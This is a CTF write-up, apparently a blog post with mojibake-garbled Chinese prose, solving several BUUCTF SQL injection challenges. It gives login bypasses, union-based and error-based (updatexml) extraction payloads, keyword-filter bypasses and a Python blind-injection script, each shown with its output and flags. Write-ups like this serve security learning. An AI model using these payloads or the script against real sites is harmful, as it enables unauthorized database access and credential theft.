<p><strong>ç¬¬äºŒæ­¥</strong></p>
<p>ç„¶åè¿›è¡Œä¸‹é¢å°è¯•</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1;show databases;</span><br><span class="line">1; show tables;</span><br></pre></td></tr></table></figure>
<p>å‡å¯è·å¾—ç­”æ¡ˆï¼Œä¸”çŸ¥é“å½“å‰tableä¸ºflag</p>
<p>ä½†æ˜¯å°è¯•ä»¥ä¸‹è¯­å¥æ—¶å¤±è´¥ï¼Œå› ä¸ºflagå’Œfromè¢«è¿‡æ»¤</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1; show flag from flag;</span><br></pre></td></tr></table></figure>
<p><strong>ç¬¬ä¸‰æ­¥</strong></p>
<p>ä½†æ˜¯è€ƒè™‘åˆ°æäº¤1æ—¶ï¼Œæ˜¯ç”±è¿”å›ç»“æœçš„ï¼ŒçŒœæµ‹åå°è¯­å¥ä¸º</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select $_POST[&#39;query&#39;] | xxx from flag; # xxxå°±æ˜¯[0] &#x3D;&gt; 1ï¼Œå› ä¸ºä¸è®ºæäº¤ä»€ä¹ˆæ•°å­—éƒ½å¾—åˆ°åŒä¸€ä¸ªç­”æ¡ˆ</span><br></pre></td></tr></table></figure>
<p>è¦ç»•è¿‡è¿™ä¸ªè¯­å¥æœ‰ä¸¤ç§æ–¹æ³•</p>
<p><strong>payload1</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select *,1|2 from flag</span><br></pre></td></tr></table></figure>
<p>å³æäº¤</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*,1</span><br></pre></td></tr></table></figure>
<p><strong>payload2</strong></p>
<p>ä¿®æ”¹sql_modeï¼Œä½¿||è¢«è§†ä¸ºè¿æ¥ç¬¦ï¼Œè€Œä¸æ˜¯é€»è¾‘æˆ–</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1;set sql_mode&#x3D;PIPES_AS_CONCAT;select 1</span><br></pre></td></tr></table></figure>
<p><strong>ç¬¬å››æ­¥</strong></p>
<p>å¾—åˆ°flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;e8aa1999-1dbc-4b3f-86d9-b961ff44cf09&#125; </span><br></pre></td></tr></table></figure>
<h2 id="sql-mode"><a href="#sql-mode" class="headerlink" title="sql_mode"></a>sql_mode</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">å‚è€ƒ https:&#x2F;&#x2F;www.cnblogs.com&#x2F;piperck&#x2F;p&#x2F;9835695.html</span><br><span class="line"></span><br><span class="line">æŸ¥çœ‹å½“å‰è¿æ¥ä¼šè¯çš„sqlæ¨¡å¼ï¼š</span><br><span class="line">mysql&gt; select @@session.sql_mode;</span><br><span class="line">æˆ–è€…ä»ç¯å¢ƒå˜é‡é‡Œå–</span><br><span class="line">mysql&gt; show variables like &quot;sql_mode&quot;;</span><br><span class="line"></span><br><span class="line">æŸ¥çœ‹å…¨å±€sql_modeè®¾ç½®ï¼š</span><br><span class="line">mysql&gt; select @@global.sql_mode;</span><br><span class="line"></span><br><span class="line">åªè®¾ç½®globalï¼Œéœ€è¦é‡æ–°è¿æ¥è¿›æ¥æ‰ä¼šç”Ÿæ•ˆ</span><br><span class="line"></span><br><span class="line">è®¾ç½®å½¢å¼å¦‚</span><br><span class="line">mysql&gt; set sql_mode&#x3D;&#39;&#39;;</span><br><span class="line">mysql&gt; set global sql_mode&#x3D;&#39;NO_ENGINE_SUBSTITUTION,STRICT_TRANS_TABLES&#39;;</span><br></pre></td></tr></table></figure>
<p>çŸ¥é“å°±å¥½ï¼Œå…·ä½“çš„sql_modeå¤ªå¤š</p>
<h1 id="EasySQL-1"><a href="#EasySQL-1" class="headerlink" title="EasySQL"></a>EasySQL</h1><p>é¢˜ç›®æ¥æºï¼šæå®¢å¤§æŒ‘æˆ˜2019</p>
<p>è€ƒå¯Ÿï¼šä¸‡èƒ½å¯†ç </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: admin&#39; or 1&#x3D;1#</span><br><span class="line">password: 1</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;2d7e92c3-eed8-407e-9763-0a66581f2030&#125;</span><br></pre></td></tr></table></figure>
<h1 id="LoveSQL"><a href="#LoveSQL" class="headerlink" title="LoveSQL"></a>LoveSQL</h1><p>æ¥æºï¼šæå®¢å¤§æŒ‘æˆ˜2019</p>
<p>å‚è€ƒï¼š<a target="_blank" rel="noopener" href="https://blog.csdn.net/vanarrow/article/details/107991185">https://blog.csdn.net/vanarrow/article/details/107991185</a></p>
<p>è€ƒå¯Ÿï¼šæŠ¥é”™æ³¨å…¥</p>
<p><strong>é”™è¯¯å°è¯•</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: admin&#39; or 1&#x3D;1#</span><br><span class="line">password: 1</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Hello adminï¼</span><br><span class="line"></span><br><span class="line">Your password is &#39;c2f1e24e0e83d0373e5bbe94c3168506&#39;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;admin&amp;password&#x3D;c2f1e24e0e83d0373e5bbe94c3168506&#39; and &#39;1&#39;&#x3D;&#39;1   #Login Success</span><br></pre></td></tr></table></figure>
<p>å‡å¤±è´¥</p>
<p>æ ¹æ®wp</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?username&#x3D;1&#39;#&amp;password&#x3D;1 # æç¤ºinput your name and passwordï¼Œè¯´æ˜è¯­å¥å¤§æ¦‚ä¸º select xxx from database where username&#x3D;&#39;$_GET[username]&#39; and password&#x3D;&#39;$_GET[password]&#39;</span><br><span class="line">?username&#x3D;1&amp;password&#x3D;12&#39; or &#39;1&#39;&#x3D;&#39;1 # éªŒè¯ä¸Šä¸€æ¡ç»“è®ºï¼Œéœ€è¦ä»usernameå¤„è¿›è¡Œæ³¨å…¥</span><br></pre></td></tr></table></figure>
<p><strong>æ³¨æ„ï¼Œè¿™é‡Œæœ‰ä¸ªå‘ã€‚è‹¥ç›´æ¥åœ¨è¾“å…¥æ¡†å¡«å†™#ï¼Œåœ¨URLä¼šè¢«è§£é‡Šæˆ%23ã€‚è€Œåœ¨firefoxçš„hackbarä¸­å¡«å†™#ï¼Œæ˜¯ä¸ä¼šè¢«è¯†åˆ«æˆsqlè¯­å¥ä¸­çš„æ³¨é‡Šç¬¦çš„</strong></p>
<p>æ­¤å¤„å¿…é¡»åœ¨usernameè¿›è¡Œæ³¨å…¥</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">?username&#x3D;admin&#39; order by 4 %23&amp;password&#x3D;1 </span><br><span class="line"># æŠ¥é”™</span><br><span class="line"></span><br><span class="line">username&#x3D;1&#39; union select 1,2,3 %23&amp;password&#x3D;1</span><br><span class="line"># æ˜¾ç¤º2,3ã€‚å› æ­¤2å’Œ3æ˜¯æ³¨å…¥ä½</span><br><span class="line"></span><br><span class="line">?username&#x3D;1&#39; union select 1,database(),2 %23&amp;password&#x3D;1</span><br><span class="line"># æ˜¾ç¤ºgeekï¼Œä¸ºæ•°æ®åº“å</span><br><span class="line"></span><br><span class="line">?username&#x3D;1&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;geek&#39;),2 %23&amp;password&#x3D;1</span><br><span class="line"># æ˜¾ç¤ºgeekuser,l0ve1ysq1</span><br><span class="line"></span><br><span class="line">?username&#x3D;1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;geekuser&#39;%23&amp;password&#x3D;1</span><br><span class="line"># æ˜¾ç¤º&#39;id,username,password&#39;</span><br><span class="line"># æŸ¥çœ‹è¡¨å†…å®¹ï¼Œæ²¡æœ‰flagï¼Œè½¬è€ŒæŸ¥çœ‹l0ve1ysq1</span><br><span class="line"></span><br><span class="line">?username&#x3D;1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;l0ve1ysq1&#39; %23&amp;password&#x3D;1</span><br><span class="line"># æ˜¾ç¤º&#39;id,username,password&#39;</span><br><span class="line"></span><br><span class="line">?username&#x3D;1&#39; union select 1,2,group_concat(id,username,password) from l0ve1ysq1 %23&amp;password&#x3D;1</span><br><span class="line"># æ˜¾ç¤º&#39;1cl4ywo_tai_nan_le,2glzjinglzjin_wants_a_girlfriend,3Z4cHAr7zCrbiao_ge_dddd_hm,40xC4m3llinux_chuang_shi_ren,5Ayraina_rua_rain,6Akkoyan_shi_fu_de_mao_bo_he,7fouc5cl4y,8fouc5di_2_kuai_fu_ji,9fouc5di_3_kuai_fu_ji,10fouc5di_4_kuai_fu_ji,11fouc5di_5_kuai_fu_ji,12fouc5di_6_kuai_fu_ji,13fouc5di_7_kuai_fu_ji,14fouc5di_8_kuai_fu_ji,15leixiaoSyc_san_da_hacker,16flagflag&#123;8e0fc55e-8d36-4db0-a48e-7e2a57fea0c9&#125;&#39;</span><br></pre></td></tr></table></figure>
<p>æ ¹æ®èŠ±æ‹¬å·ï¼Œå¾—åˆ°flag</p>
<h2 id="æç¤º"><a href="#æç¤º" class="headerlink" title="æç¤º"></a>æç¤º</h2><p>åœ¨Hackbarä¸­ï¼Œè‹¥ä»¥getæ–¹å¼æäº¤sqlè¯­å¥ï¼Œéœ€è¦æ³¨æ„è½¬ç é—®é¢˜ã€‚æ¯”å¦‚ç©ºæ ¼ä¸º+ï¼Œ#ä¸º%23ç­‰</p>
<h1 id="BabySQL"><a href="#BabySQL" class="headerlink" title="BabySQL"></a>BabySQL</h1><p>æ¥æºï¼šæå®¢å¤§æŒ‘æˆ˜2019</p>
<p>å‚è€ƒï¼š<a target="_blank" rel="noopener" href="https://ca01h.top/Web_security/ctf_writeup/7.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94SQL%E6%B3%A8%E5%85%A5/#SUCTF2019-EasySQL">https://ca01h.top/Web_security/ctf_writeup/7.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94SQL%E6%B3%A8%E5%85%A5/#SUCTF2019-EasySQL</a></p>
<p>è€ƒå¯Ÿï¼šåŒå†™ç»•è¿‡</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?username&#x3D;1&#39; order by 1 %23&amp;password&#x3D;1</span><br><span class="line"># You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#39;der 1 #&#39; and password&#x3D;&#39;1&#39;&#39; at line 1</span><br><span class="line">select x,y,z from db where username&#x3D;&#39;username&#39; and password&#x3D;&#39;password&#39;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>æ ¹æ®wpï¼Œå¯ä»¥åŒå†™ç»•è¿‡</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">?username&#x3D;123&#39; ununionion seselectlect 1,database(),3%23&amp;password&#x3D;bbyy</span><br><span class="line"></span><br><span class="line">?username&#x3D;1&#39; uniunionon seselectlect 1,2,  group_concat(table_name) ffromrom infoorrmation_schema.tables whwhereere table_schema&#x3D;database() %23&amp;password&#x3D;123</span><br><span class="line"># æ˜¾ç¤º b4bsql,geekuser</span><br><span class="line"></span><br><span class="line">?username&#x3D;1&#39; uniunionon seselectlect 1,2,  group_concat(column_name) ffromrom infoorrmation_schema.columns whwhereere table_name&#x3D;&#39;b4bsql&#39; %23&amp;password&#x3D;123</span><br><span class="line"># æ˜¾ç¤º id,username,password</span><br><span class="line"></span><br><span class="line">?username&#x3D;1&#39; uniunionon seselectlect 1,2,  group_concat(passwoorrd) ffromrom b4bsql %23&amp;password&#x3D;123</span><br><span class="line"># æ˜¾ç¤º&#39;i_want_to_play_2077,sql_injection_is_so_fun,do_you_know_pornhub,github_is_different_from_pornhub,you_found_flag_so_stop,i_told_you_to_stop,hack_by_cl4y,flag&#123;389fb140-395f-4f93-9137-fea88d9947b5&#125;&#39;</span><br></pre></td></tr></table></figure>
<p>å¾—åˆ°flag</p>
<h1 id="hardsql"><a href="#hardsql" class="headerlink" title="hardsql"></a>hardsql</h1><p>æ¥æºï¼šæå®¢å¤§æŒ‘æˆ˜2019</p>
<p>å‚è€ƒï¼š<a target="_blank" rel="noopener" href="https://www.cnblogs.com/wangtanzhi/p/12257412.html">https://www.cnblogs.com/wangtanzhi/p/12257412.html</a></p>
<p>è€ƒå¯Ÿï¼šxpathæŠ¥é”™æ³¨å…¥</p>
<p><strong>è‡ªå·±åšçš„éƒ¨åˆ†</strong></p>
<p>å‘ç°å¾ˆå¤šå¸¸ç”¨å­—ä¼šæŠ¥é”™ï¼Œå› æ­¤fuzzè·‘äº†ä¸€ä¸‹ï¼ˆæ­¤å¤„éœ€è¦ä¸€ä¸ªå¥½è¯å…¸ï¼Œæœé›†çš„è¯å…¸æœ‰ç‚¹å‘çˆ¹ï¼‰</p>
<p>ç»“æœunionå’Œandã€ç©ºæ ¼éƒ½è¢«è¿‡æ»¤</p>
<p>ç©ºæ ¼è¿‡æ»¤å¯ä»¥ç”¨ä»¥ä¸‹å½¢å¼æ‰§è¡Œsqlè¯­å¥</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select(*)from(db)</span><br></pre></td></tr></table></figure>
<p><strong>ä»¥ä¸‹ä¸ºå‚è€ƒéƒ¨åˆ†</strong></p>
<p>å‘ç°æŠ¥é”™æ³¨å…¥çš„updatexmlæ²¡è¿‡æ»¤ï¼Œå°è¯•</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?username&#x3D;admin&#39;^updatexml(1,concat(0x7e,(SELECT(database())),0x7e),1)%23&amp;password&#x3D;123</span><br><span class="line"># è¿”å›XPATH syntax error: &#39;~geek~&#39;</span><br></pre></td></tr></table></figure>
<p>ä¹‹åæ“ä½œç±»ä¼¼</p>
<p>æ‰§è¡Œåˆ°</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?username&#x3D;admin&#39;^updatexml(1,concat(0x7e,(select(password)from(H4rDsq1)),0x7e),1)%23&amp;password&#x3D;123</span><br><span class="line"># flag&#123;582fda48-ebec-495e-acda-7</span><br></pre></td></tr></table></figure>
<p>åªå‡ºç°äº†ä¸€åŠçš„flagï¼Œè€Œsubstrè¢«è¿‡æ»¤</p>
<p>æ ¹æ®wpï¼Œä½¿ç”¨leftå’Œrightè¿›è¡Œæ‹¼æ¥æ“ä½œã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?username&#x3D;admin&#39;^updatexml(1,concat(0x7e,(select(right(password,30))from(H4rDsq1)),0x7e),1)%23&amp;password&#x3D;123</span><br><span class="line"># 8-ebec-495e-acda-76d8e7055dec&#125;</span><br></pre></td></tr></table></figure>
<p>ä¹Ÿå¯ä»¥ä½¿ç”¨reverseå‡½æ•°ï¼Œè‡ªç„¶æŠŠå³åŠè¾¹çš„æ˜¾ç¤ºå‡ºæ¥äº†</p>
<h1 id="finalsql"><a href="#finalsql" class="headerlink" title="finalsql"></a>finalsql</h1><p>æ¥æºï¼šæå®¢å¤§æŒ‘æˆ˜2019</p>
<p>å‚è€ƒï¼š<a target="_blank" rel="noopener" href="https://www.cnblogs.com/hello-there/p/13026698.html">https://www.cnblogs.com/hello-there/p/13026698.html</a></p>
<p>è€ƒå¯Ÿï¼šå¼‚æˆ–æ³¨å…¥</p>
<p>é¦–å…ˆFuzzæµ‹è¯•ï¼Œå‘ç°è¿‡æ»¤äº†å¤§éƒ¨åˆ†å­—æ®µ</p>
<p>å…¶æ¬¡è®¿é—®é¡µé¢ä¸­çš„äº”ä¸ªæ ‡é¢˜ï¼Œå‘ç°URLä¸Šä¼šæœ‰idå­—æ®µçš„å˜åŒ–ã€‚è€Œè®¿é—®[1,6]ä¹‹å¤–çš„idå€¼æ—¶ï¼Œä¼šæç¤ºERRORã€‚æ¨ç†å¤„æ­¤å¤„å¯å¸ƒå°”æ³¨å…¥</p>
<p>ç”±äºFUZZä¸­ifè¢«è¿‡æ»¤ï¼Œç”¨å¼‚æˆ–ç¬¦^ä»£æ›¿if</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url&#x3D;&quot;http:&#x2F;&#x2F;fb37a3d0-7d7e-44ae-8436-df42f39c93a3.node3.buuoj.cn&#x2F;search.php?id&#x3D;1&quot;</span><br><span class="line"></span><br><span class="line">text &#x3D; &quot;Not this!&quot;</span><br><span class="line">ans &#x3D; &quot;&quot;</span><br><span class="line">for i in range(1, 600):</span><br><span class="line">	# print(&quot;debug&quot;)</span><br><span class="line">	low &#x3D; 31</span><br><span class="line">	high &#x3D; 128</span><br><span class="line">	while low &lt; high:</span><br><span class="line">		mid &#x3D; (low + high) &gt;&gt; 1</span><br><span class="line">		# print(c)</span><br><span class="line">		# s &#x3D; &quot;^(ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;)&quot;.format(i,mid)</span><br><span class="line">		s &#x3D; &quot;^(ascii(substr((select(group_concat(password))from(F1naI1y)),&#123;&#125;,1))&gt;&#123;&#125;)&quot;.format(i,mid)</span><br><span class="line">		# print(s)</span><br><span class="line">		# print(url+s)</span><br><span class="line">		response &#x3D; requests.get(url+s)</span><br><span class="line">		# print(response.text)</span><br><span class="line">		if &quot;ERROR&quot; in response.text:</span><br><span class="line">			low &#x3D; mid + 1</span><br><span class="line">		else:</span><br><span class="line">			high &#x3D; mid</span><br><span class="line">	if low &#x3D;&#x3D; 31 or high &#x3D;&#x3D; 128:</span><br><span class="line">		break</span><br><span class="line">	ans +&#x3D; chr(low)</span><br><span class="line">	print(ans)</span><br><span class="line">print(ans)</span><br><span class="line"></span><br><span class="line"># if(substr(select(flag)from(flag),&#123;&#125;,1)&#x3D;&#123;&#125;,1,2)</span><br><span class="line"></span><br><span class="line">		</span><br></pre></td></tr></table></figure>




<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;6103d756-d25b-48b2-bf23-940081a321df&#125;</span><br></pre></td></tr></table></figure>
<h1 id="BabySQli1"><a href="#BabySQli1" class="headerlink" title="BabySQli1"></a>BabySQli1</h1><p>æ¥æºï¼šGXYCTF2019</p>
<p>å‚è€ƒï¼š<a target="_blank" rel="noopener" href="https://www.cnblogs.com/shangguanchanghong/p/13805558.html">https://www.cnblogs.com/shangguanchanghong/p/13805558.html</a></p>
<p>è€ƒå¯Ÿï¼šå¤§å°å†™ç»•è¿‡ï¼Œåå°è¯­å¥çŒœæµ‹</p>
<p>Fuzzæµ‹è¯•ï¼Œå¯ä»¥çœ‹åˆ°adminâ€™æç¤ºsqlé”™è¯¯ï¼Œæœ‰å•å¼•å·æ³¨å…¥ï¼›å·¦æ‹¬å·ï¼Œå³æ‹¬å·ï¼Œç­‰å·ï¼Œorï¼Œordï¼Œorderï¼Œinformation_schema.tablesï¼Œconcat_wsï¼Œxorç­‰è¢«è¿‡æ»¤</p>
<p>æŸ¥çœ‹ç½‘é¡µæºç </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5</span><br></pre></td></tr></table></figure>
<p>æ ¹æ®<a target="_blank" rel="noopener" href="https://ca01h.top/Web_security/ctf_writeup/7.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94SQL%E6%B3%A8%E5%85%A5/#GXYCTF2019-BabysqliV1">https://ca01h.top/Web_security/ctf_writeup/7.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94SQL%E6%B3%A8%E5%85%A5/#GXYCTF2019-BabysqliV1</a><br>base32 åªæœ‰å¤§å†™å­—æ¯å’Œæ•°å­—æ•°å­—ç»„æˆï¼Œæˆ–è€…åé¢æœ‰ä¸‰ä¸ªç­‰å·ã€‚<br>base64 åªæœ‰å¤§å†™å­—æ¯å’Œæ•°å­—ï¼Œå°å†™å­—æ¯ç»„æˆï¼Œåé¢ä¸€èˆ¬æ˜¯ä¸¤ä¸ªç­‰å·ã€‚<br>æ˜æ˜¾ï¼Œé‚£æ®µæ–‡å­—æ˜¯base32åŠ å¯†</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c2VsZWN0ICogZnJvbSB1c2VyIHdoZXJlIHVzZXJuYW1lID0gJyRuYW1lJw&#x3D;&#x3D;</span><br><span class="line">select * from user where username &#x3D; &#39;$name&#39;</span><br></pre></td></tr></table></figure>
<p>å¤§å°å†™ç»•è¿‡ï¼Œå¾—åˆ°åˆ—æ•°</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">name&#x3D;admin&#39; Or 1 Order by 3 #&amp;pw&#x3D;admin</span><br><span class="line">name&#x3D;admin&#39; Or 1 Order by 4 #&amp;pw&#x3D;admin</span><br></pre></td></tr></table></figure>
<p>æµ‹è¯•nameä¸ºå“ªä¸€è¡Œ</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">name&#x3D;a&#39; union select &#39;admin&#39;,2,3 #&amp;pw&#x3D;admin</span><br><span class="line">name&#x3D;a&#39; union select 1,&#39;admin&#39;,3 #&amp;pw&#x3D;admin</span><br></pre></td></tr></table></figure>
<p>ç¬¬äºŒä¸ªæç¤ºpassé”™è¯¯ï¼Œè¯´æ˜adminæ”¾åœ¨ç¬¬äºŒè¡Œ</p>
<p>æ³¨æ„æ­¤å¤„adminéœ€è¦ç”¨å•å¼•å·æ‹¬èµ·æ¥ï¼Œåœ¨sqlè¯­å¥ä¸­ä¼šè¢«è§£é‡Šä¸ºå­—ç¬¦ä¸²ï¼Œè€Œä¸æ˜¯æŸä¸ªåˆ—å</p>
<p>wpè¯´ï¼Œä¸€èˆ¬åå°éƒ½ä¼šç”¨md5è®¡ç®—å¯†ç hashå€¼å¹¶å­˜å‚¨ï¼Œæ‰€ä»¥çŒœæµ‹åç«¯æºç æ˜¯è¿™æ ·</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$name &#x3D; $_POST[&#39;name&#39;];</span><br><span class="line">$passwd &#x3D; md5($_POST[&#39;pw&#39;]);</span><br><span class="line"></span><br><span class="line">$sql &#x3D; &quot;select * from user where username &#x3D; &#39;$name&#39;&quot;;</span><br><span class="line">$query &#x3D; mysql_query($sql);</span><br><span class="line"></span><br><span class="line">if (!strcasecmp($passwd, $query[passwd])) &#123;</span><br><span class="line">	echo $flag;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">	echo(&quot;Wrong Pass&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æ‰€ä»¥passwordä¸ºpwçš„å€¼çš„md5å€¼å³å¯</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name&#x3D;a&#39; union select 1,&#39;admin&#39;,&#39;21232f297a57a5a743894a0e4a801fc3&#39; #&amp;pw&#x3D;admin</span><br></pre></td></tr></table></figure>


<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;d69a01fe-e2ac-4330-b89a-d2ff0f6bcac0&#125; </span><br></pre></td></tr></table></figure>
<h1 id="EasySQL-2"><a href="#EasySQL-2" class="headerlink" title="EasySQL"></a>EasySQL</h1><p>æ¥æºï¼šRCTF2015</p>
<p>å‚è€ƒï¼š<a target="_blank" rel="noopener" href="https://ca01h.top/Web_security/ctf_writeup/7.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94SQL%E6%B3%A8%E5%85%A5/#GXYCTF2019-BabysqliV1">https://ca01h.top/Web_security/ctf_writeup/7.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94SQL%E6%B3%A8%E5%85%A5/#GXYCTF2019-BabysqliV1</a></p>
<p>è€ƒå¯Ÿï¼šæŠ¥é”™æ³¨å…¥ï¼Œsqlçš„reverseå‡½æ•°ï¼Œsqlçš„regexpå‡½æ•°</p>
<p>æ³¨å†Œ+ç™»å½•+ä¿®æ”¹å¯†ç ï¼Œç®—æ˜¯æ¨¡æ¿é¢˜</p>
<p>å› ä¸ºç™»å½•åå¯ä»¥æ˜¾ç¤ºç”¨æˆ·åï¼Œåˆæ­¥åˆ¤æ–­åœ¨ç”¨æˆ·åå¤„æ³¨å…¥</p>
<p>åˆ†åˆ«æ³¨å†Œç”¨æˆ·zzâ€™å’Œzzâ€ï¼Œzzâ€åœ¨ä¿®æ”¹å¯†ç æ—¶æŠ¥é”™</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&quot;zz&quot;&quot; and pwd&#x3D;&#39;c81e728d9d4c2f636f067f89cc14862c&#39;&#39; at line 1</span><br></pre></td></tr></table></figure>
<p>åè¿‡æ¥åˆ¤æ–­è¯­å¥å¤§è‡´ä¸º</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user where username &#x3D; &quot;zz&quot; and and pwd&#x3D;&#39;c81e728d9d4c2f636f067f89cc14862c&#39; # åé¢è¿™ä¸ªåº”è¯¥æ˜¯md5å€¼</span><br></pre></td></tr></table></figure>
<p>é‚£ä¹ˆä¹‹åå°±xpathæ³¨å…¥å³å¯</p>
<p>æ³¨æ„æœ¬é¢˜è¿‡æ»¤äº†orï¼Œsubstrï¼Œå¤šä½™çš„ç©ºæ ¼ï¼Œå¼‚æˆ–ç¬¦^</p>
